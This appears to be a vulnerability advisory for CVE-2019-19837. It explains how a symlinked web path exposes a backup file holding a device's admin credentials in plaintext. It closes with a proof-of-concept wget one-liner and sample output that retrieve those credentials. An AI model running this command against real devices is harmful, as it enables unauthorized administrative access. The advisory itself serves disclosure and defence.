title: 'Admin credentials leakage'

The above shows a symbolic link from `/web/user/wps_tool_cache` to `/tmp` directory. `rpmd` executable writes a backup file named `/var/run/rpmkey` with a new revision number.

`/var/run` is also symbolically linked to `/tmp/`, hence one can fetch this file as well. `rpmkey` contained the admin credentails *plaintext* in this following fields: `all_powerful_login_name` and `all_powerful_login_password`. 

This file is fetchable due to [CVE-2019-19837](/vluns/ALEPH-2019007)

Information about the exploitation of the vulnerability can be found in our [blog post](/2020/01/13/ruckus-wireless/) or the [36C3 talk](https://youtu.be/bmGtG55Zz1Q?t=597).


## Proof Of Concept ##
Admin credentials leakage one-liner:
``` shell
âžœ  demo num=$(wget -q -O - 192.168.0.1/user/wps_tool_cache/var/run/rpmkey.rev);\  
         wget -q -O - 192.168.0.1/user/wps_tool_cache/var/run/rpmkey$num|\
         strings|grep -A 1 all_powerful_login

all_powerful_login_name
admin
all_powerful_login_password
mooncake

```
